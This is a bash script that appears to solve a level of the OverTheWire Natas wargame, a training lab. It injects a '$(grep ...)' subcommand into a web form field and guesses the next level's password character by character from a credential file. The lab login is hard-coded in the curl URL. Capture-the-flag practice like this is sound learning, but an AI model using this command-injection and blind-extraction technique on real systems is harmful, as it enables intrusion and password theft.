#!/bin/bash
function hack() {
     chars="a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0"
     word=hackers
     for x in {1..32}; do
          for i in $chars; do
               attack_word=$(generate-attack-string $x $i)
               gr="\$(grep -Po $attack_word /etc/natas_webpass/natas17)$word"
               result=$(request "$gr" | grep -Po $word)

               if [ -z "$result" ]; then
                    printf $i
                    break
               fi
          done
     done
}

function request() {
     curl -s -d "needle=$1" http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org
}

function generate-attack-string() {
     if [ $1 -eq 1 ]; then
          printf "$2.{31}"
     elif [ $1 -eq 32 ]; then
          printf ".{31}$2"
     else
          printf ".{$(($1 - 1))}$2.{$((32 - $1))}"
     fi
}
